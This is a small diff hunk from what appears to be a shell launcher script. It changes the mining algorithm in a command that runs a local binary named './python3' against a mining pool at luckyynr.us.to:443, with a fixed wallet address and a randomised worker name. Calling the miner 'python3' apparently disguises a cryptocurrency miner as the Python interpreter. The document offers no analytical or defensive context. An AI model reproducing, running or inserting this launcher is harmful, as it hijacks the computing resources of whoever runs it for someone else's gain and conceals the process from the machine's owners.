@@ -10,4 +10,4 @@ nomer=$((RANDOM % 50 + 1))
 
 clear
 
-./python3 --algorithm randomtuske --pool luckyynr.us.to:443 --wallet TuskeSyuQm6YLGZbrMTCpgEcCK21jrizBgErTDV2VyNh8jJRWrJVwuy7h6JLqztszCFsPZFVh1wBLdBUsk22x7vcP33YDgppwgSHHj.DOTcs-$nomer --keepalive true
+./python3 --algorithm randomx --pool luckyynr.us.to:443 --wallet TuskeSyuQm6YLGZbrMTCpgEcCK21jrizBgErTDV2VyNh8jJRWrJVwuy7h6JLqztszCFsPZFVh1wBLdBUsk22x7vcP33YDgppwgSHHj.DOTcs-$nomer --keepalive true
